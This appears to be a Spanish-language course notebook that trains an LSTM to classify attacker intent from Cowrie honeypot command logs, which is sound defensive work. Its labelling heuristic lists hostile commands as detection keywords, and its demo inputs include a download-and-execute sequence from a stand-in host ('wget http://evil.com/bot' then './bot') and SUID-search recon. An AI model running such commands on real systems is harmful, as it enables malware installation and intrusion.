# 🛡️ Clasificación Inteligente de Ataques en Honeypots (SIEM)
**Asignatura: Seguridad de la Información**

Este notebook cubre los pasos 2 al 5 del proyecto, adaptado para la clasificación heurística y análisis de intenciones maliciosas:
1. Preprocesamiento, extracción de sesiones y etiquetado automático (Ransomware, Botnets, etc.)
2. Tokenización y preparación del dataset para Deep Learning
3. Entrenamiento de modelo LSTM para clasificar la intención del atacante
4. Evaluación: Accuracy, Perplexity, Precision, Recall

**Requisito previo:** tener el archivo `cowrie.json` (con las miles de sesiones generadas) en la misma carpeta que este notebook.

In [ ]:
# Ejecutar solo la primera vez
!pip install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cpu -q -q
print("✅ Dependencias instaladas")

In [ ]:
import json
import os
import re
import math
import random
import numpy as np
import pandas as pd
import matplotlib.pyplot as plt
from collections import Counter, defaultdict
from sklearn.model_selection import train_test_split
from sklearn.metrics import precision_score, recall_score, classification_report

import torch
import torch.nn as nn
from torch.utils.data import Dataset, DataLoader

# Reproducibilidad
SEED = 42
random.seed(SEED)
np.random.seed(SEED)
torch.manual_seed(SEED)

# Parámetros generales
LOG_FILE      = "cowrie.json"   
MAX_SEQ_LEN   = 20              # Longitud máxima de comandos por sesión analizada
MIN_FREQ      = 2               
BATCH_SIZE    = 64
EMBED_DIM     = 64
HIDDEN_DIM    = 128
NUM_LAYERS    = 2
DROPOUT       = 0.3
EPOCHS        = 30
LR            = 0.001
DEVICE        = torch.device("cuda" if torch.cuda.is_available() else "cpu")

print(f"Usando dispositivo: {DEVICE}")

In [ ]:
def cargar_logs_cowrie(filepath):
    eventos_cargados = []
    with open(filepath, "r", encoding="utf-8") as f:
        for linea in f:
            linea = linea.strip()
            if not linea: continue
            try:
                eventos_cargados.append(json.loads(linea))
            except json.JSONDecodeError:
                pass
    return eventos_cargados

if os.path.exists(LOG_FILE):
    print(f"📂 Cargando logs desde {LOG_FILE}...")
    eventos = cargar_logs_cowrie(LOG_FILE)
    print(f"✅ Total de eventos cargados: {len(eventos)}")
else:
    print(f"⚠️ No se encontró {LOG_FILE}. Asegúrate de haberlo descargado del servidor.")
    eventos = []

def limpiar_comando(cmd):
    cmd = cmd.lower().strip()
    cmd = re.sub(r'https?://\S+', '<URL>', cmd)
    cmd = re.sub(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', '<IP>', cmd)
    cmd = re.sub(r'\b\d{5,}\b', '<NUM>', cmd)
    cmd = re.sub(r'/(?:[\w./-]+/)+([\w.]+)', r'/\1', cmd)
    cmd = re.sub(r'\s+', ' ', cmd).strip()
    return cmd[:120]

def etiquetar_sesion(comandos):
    """Asigna una categoría al ataque analizando toda la secuencia de comandos"""
    texto = " ".join(comandos).lower()
    if "btc" in texto or "rm -rf" in texto or "dd if=" in texto or "iptables -f" in texto:
        return "Destrucción/Ransomware"
    elif "tar " in texto or "zip " in texto or "mysqldump" in texto or "exfil" in texto:
        return "Robo de Datos"
    elif "useradd" in texto or "crontab" in texto or "authorized_keys" in texto:
        return "Persistencia/Backdoor"
    elif "wget" in texto or "curl" in texto or "tftp" in texto or "./xmrig" in texto:
        return "Descarga Malware/Botnet"
    elif "sudo -l" in texto or "gcc" in texto or "chmod 777 /etc" in texto:
        return "Escalada de Privilegios"
    else:
        return "Reconocimiento/Escaneo"

def extraer_sesiones_y_etiquetas(eventos_raw):
    sesiones_raw = defaultdict(list)
    for evento in eventos_raw:
        if evento.get("eventid") == "cowrie.command.input":
            session = evento.get("session", "unknown")
            cmd = evento.get("input", "").strip()
            if cmd:
                sesiones_raw[session].append(limpiar_comando(cmd))
    
    dataset = []
    for session_id, cmds in sesiones_raw.items():
        if len(cmds) > 2: # Ignoramos sesiones sin suficiente contexto
            etiqueta = etiquetar_sesion(cmds)
            dataset.append((cmds, etiqueta))
    return dataset

sesiones_etiquetadas = extraer_sesiones_y_etiquetas(eventos)
print(f"\n📌 Sesiones válidas extraídas y etiquetadas: {len(sesiones_etiquetadas)}")

if sesiones_etiquetadas:
    etiquetas_counts = Counter([etiqueta for _, etiqueta in sesiones_etiquetadas])
    print("\n📊 Distribución de Tipos de Ataque:")
    for eti, count in etiquetas_counts.most_common():
        print(f"   {eti:<30} → {count} sesiones")

In [ ]:
class Vocabulario:
    PAD = "<PAD>"
    UNK = "<UNK>"

    def __init__(self, min_freq=2):
        self.min_freq = min_freq
        self.token2idx = {self.PAD: 0, self.UNK: 1}
        self.idx2token = {0: self.PAD, 1: self.UNK}

    def construir(self, secuencias):
        contador = Counter(cmd for seq in secuencias for cmd in seq)
        for token, freq in contador.items():
            if freq >= self.min_freq and token not in self.token2idx:
                idx = len(self.token2idx)
                self.token2idx[token] = idx
                self.idx2token[idx] = token
        return self

    def encode(self, token):
        return self.token2idx.get(token, self.token2idx[self.UNK])

    def decode(self, idx):
        return self.idx2token.get(idx, self.UNK)

    def __len__(self):
        return len(self.token2idx)

# 1. Construir Vocabularios
vocab = Vocabulario(min_freq=MIN_FREQ)
vocab.construir([cmds for cmds, _ in sesiones_etiquetadas])

clases_ataque = list(etiquetas_counts.keys())
label2idx = {label: idx for idx, label in enumerate(clases_ataque)}
idx2label = {idx: label for label, idx in label2idx.items()}

# 2. Generar tensores X (secuencias) e y (etiquetas)
X, y = [], []
pad_idx = vocab.encode(Vocabulario.PAD)

for cmds, etiqueta in sesiones_etiquetadas:
    encoded_cmds = [vocab.encode(c) for c in cmds]
    # Rellenamos por la izquierda para que el último token procesado sea el más reciente
    if len(encoded_cmds) >= MAX_SEQ_LEN:
        encoded_cmds = encoded_cmds[-MAX_SEQ_LEN:]
    else:
        encoded_cmds = [pad_idx] * (MAX_SEQ_LEN - len(encoded_cmds)) + encoded_cmds
        
    X.append(encoded_cmds)
    y.append(label2idx[etiqueta])

X = np.array(X, dtype=np.int64)
y = np.array(y, dtype=np.int64)

# 3. Splits
X_train, X_temp, y_train, y_temp = train_test_split(X, y, test_size=0.30, random_state=SEED)
X_val, X_test, y_val, y_test = train_test_split(X_temp, y_temp, test_size=0.50, random_state=SEED)

class CowrieDataset(Dataset):
    def __init__(self, X_data, y_data):
        self.X = torch.tensor(X_data, dtype=torch.long)
        self.y = torch.tensor(y_data, dtype=torch.long)

    def __len__(self): return len(self.X)
    def __getitem__(self, idx): return self.X[idx], self.y[idx]

train_loader = DataLoader(CowrieDataset(X_train, y_train), batch_size=BATCH_SIZE, shuffle=True)
val_loader   = DataLoader(CowrieDataset(X_val, y_val),   batch_size=BATCH_SIZE)
test_loader  = DataLoader(CowrieDataset(X_test, y_test),  batch_size=BATCH_SIZE)

print(f"✅ Vocabulario de comandos: {len(vocab)} tokens")
print(f"✅ Dataset listo. Clases a predecir: {len(clases_ataque)}")
print(f"   Train: {len(X_train)} | Val: {len(X_val)} | Test: {len(X_test)}")

In [ ]:
class LSTMClassifier(nn.Module):
    def __init__(self, vocab_size, num_classes, embed_dim, hidden_dim, num_layers, dropout, pad_idx):
        super().__init__()
        self.embedding = nn.Embedding(vocab_size, embed_dim, padding_idx=pad_idx)
        self.lstm = nn.LSTM(
            input_size=embed_dim,
            hidden_size=hidden_dim,
            num_layers=num_layers,
            batch_first=True,
            dropout=dropout if num_layers > 1 else 0.0
        )
        self.dropout = nn.Dropout(dropout)
        self.fc = nn.Linear(hidden_dim, num_classes)

    def forward(self, x):
        emb = self.dropout(self.embedding(x))         
        out, _ = self.lstm(emb)                        
        last = out[:, -1, :] # Tomamos el último estado oculto para clasificar toda la secuencia
        logits = self.fc(self.dropout(last))           
        return logits

model = LSTMClassifier(
    vocab_size  = len(vocab),
    num_classes = len(clases_ataque),
    embed_dim   = EMBED_DIM,
    hidden_dim  = HIDDEN_DIM,
    num_layers  = NUM_LAYERS,
    dropout     = DROPOUT,
    pad_idx     = vocab.encode(Vocabulario.PAD)
).to(DEVICE)

n_params = sum(p.numel() for p in model.parameters() if p.requires_grad)
print(f"✅ Modelo LSTM creado con {n_params:,} parámetros entrenables")

In [ ]:
# IMPORTANTE: Como es clasificación de secuencia completa, usamos CrossEntropy estándar
criterion = nn.CrossEntropyLoss() 
optimizer = torch.optim.Adam(model.parameters(), lr=LR, weight_decay=1e-5)
scheduler = torch.optim.lr_scheduler.ReduceLROnPlateau(
    optimizer, mode="min", factor=0.5, patience=5, verbose=True
)

def run_epoch(model, loader, criterion, optimizer=None, training=True):
    model.train() if training else model.eval()
    total_loss, total_correct, total_samples = 0.0, 0, 0

    ctx = torch.enable_grad() if training else torch.no_grad()
    with ctx:
        for X_batch, y_batch in loader:
            X_batch, y_batch = X_batch.to(DEVICE), y_batch.to(DEVICE)

            logits = model(X_batch)          
            loss   = criterion(logits, y_batch)

            if training:
                optimizer.zero_grad()
                loss.backward()
                nn.utils.clip_grad_norm_(model.parameters(), max_norm=1.0) 
                optimizer.step()

            preds = logits.argmax(dim=1)
            total_correct  += (preds == y_batch).sum().item()
            total_samples  += y_batch.size(0)
            total_loss     += loss.item() * y_batch.size(0)

    return total_loss / total_samples, total_correct / total_samples

print("✅ Optimizador y motor de entrenamiento listos")

In [ ]:
historia = {"train_loss": [], "val_loss": [], "train_acc": [], "val_acc": []}
mejor_val_loss = float("inf")
best_model_path = "lstm_clasificador_best.pt"

print(f"🚀 Entrenando {EPOCHS} épocas en {DEVICE}...\n")
print(f"{'Época':>6} | {'Train Loss':>10} | {'Val Loss':>10} | {'Train Acc':>10} | {'Val Acc':>10}")
print("-" * 60)

for epoch in range(1, EPOCHS + 1):
    train_loss, train_acc = run_epoch(model, train_loader, criterion, optimizer, training=True)
    val_loss,   val_acc   = run_epoch(model, val_loader,   criterion, training=False)
    scheduler.step(val_loss)

    historia["train_loss"].append(train_loss)
    historia["val_loss"].append(val_loss)
    historia["train_acc"].append(train_acc)
    historia["val_acc"].append(val_acc)

    if val_loss < mejor_val_loss:
        mejor_val_loss = val_loss
        torch.save(model.state_dict(), best_model_path)
        marcador = " ← mejor"
    else:
        marcador = ""

    if epoch % 5 == 0 or epoch == 1:
        print(f"{epoch:>6} | {train_loss:>10.4f} | {val_loss:>10.4f} | "
              f"{train_acc:>10.4f} | {val_acc:>10.4f}{marcador}")

print(f"\n✅ Entrenamiento completado. Mejor modelo guardado en '{best_model_path}'")

In [ ]:
fig, axes = plt.subplots(1, 2, figsize=(14, 5))

axes[0].plot(historia["train_loss"], label="Train", color="steelblue")
axes[0].plot(historia["val_loss"],   label="Validación", color="coral")
axes[0].set_xlabel("Época")
axes[0].set_ylabel("Cross-Entropy Loss")
axes[0].set_title("Curva de pérdida (Loss)")
axes[0].legend()
axes[0].grid(True, alpha=0.3)

axes[1].plot(historia["train_acc"], label="Train", color="steelblue")
axes[1].plot(historia["val_acc"],   label="Validación", color="coral")
axes[1].set_xlabel("Época")
axes[1].set_ylabel("Accuracy")
axes[1].set_title("Curva de precisión (Accuracy)")
axes[1].legend()
axes[1].grid(True, alpha=0.3)

plt.suptitle("Entrenamiento SIEM — Clasificador de Ataques LSTM", fontsize=13, fontweight="bold")
plt.tight_layout()
plt.savefig("curvas_entrenamiento_clasificacion.png", dpi=150)
plt.show()

In [ ]:
model.load_state_dict(torch.load(best_model_path, map_location=DEVICE))

def evaluar_completo(model, loader, criterion):
    model.eval()
    all_preds, all_labels = [], []
    total_loss, total_samples = 0.0, 0

    with torch.no_grad():
        for X_batch, y_batch in loader:
            X_batch, y_batch = X_batch.to(DEVICE), y_batch.to(DEVICE)
            logits = model(X_batch)
            loss = criterion(logits, y_batch)

            preds = logits.argmax(dim=1)
            all_preds.extend(preds.cpu().numpy())
            all_labels.extend(y_batch.cpu().numpy())
            total_loss    += loss.item() * y_batch.size(0)
            total_samples += y_batch.size(0)

    avg_loss   = total_loss / total_samples
    perplexity = math.exp(avg_loss)             
    accuracy   = np.mean(np.array(all_preds) == np.array(all_labels))
    precision  = precision_score(all_labels, all_preds, average="macro", zero_division=0)
    recall     = recall_score(all_labels, all_preds, average="macro", zero_division=0)

    return {"loss": avg_loss, "perplexity": perplexity, "accuracy": accuracy, 
            "precision": precision, "recall": recall, "preds": all_preds, "labels": all_labels}

resultados = evaluar_completo(model, test_loader, criterion)

print("📊 MÉTRICAS FINALES EN DATASET DE TEST")
print("=" * 40)
print(f"   Loss        : {resultados['loss']:.4f}")
print(f"   Perplexity  : {resultados['perplexity']:.2f} (Incertidumbre de clase)")
print(f"   Accuracy    : {resultados['accuracy']*100:.2f}%")
print(f"   Precision   : {resultados['precision']*100:.2f}% (Macro)")
print(f"   Recall      : {resultados['recall']*100:.2f}% (Macro)")

In [ ]:
print("📋 Informe detallado por tipo de ataque:")
print(classification_report(
    resultados["labels"], resultados["preds"],
    target_names=clases_ataque,
    zero_division=0
))

In [ ]:
def predecir_intencion(model, vocab, idx2label, comandos, seq_len, device=DEVICE):
    model.eval()
    encoded = [vocab.encode(limpiar_comando(c)) for c in comandos]
    
    if len(encoded) >= seq_len:
        encoded = encoded[-seq_len:]
    else:
        encoded = [vocab.encode(Vocabulario.PAD)] * (seq_len - len(encoded)) + encoded

    x = torch.tensor([encoded], dtype=torch.long).to(device)
    with torch.no_grad():
        logits = model(x)[0]
        probs  = torch.softmax(logits, dim=0)

    top_probs, top_indices = probs.topk(3)
    print(f"🔍 Analizando secuencia: {comandos}")
    print(f"🚨 Intención Detectada:")
    for i, (idx, prob) in enumerate(zip(top_indices, top_probs), 1):
        barra = "█" * int(prob.item() * 30)
        print(f"   {i}. {prob.item()*100:6.1f}% {barra} {idx2label[idx.item()]}")

# Ejemplos simulados
ataques_demo = [
    ["whoami", "uname -a", "cat /etc/os-release"],
    ["ls", "cd /tmp", "wget http://evil.com/bot", "chmod +x bot", "./bot"],
    ["sudo -l", "find / -perm -4000"],
]

for ataque in ataques_demo:
    predecir_intencion(model, vocab, idx2label, ataque, MAX_SEQ_LEN)
    print("-" * 50)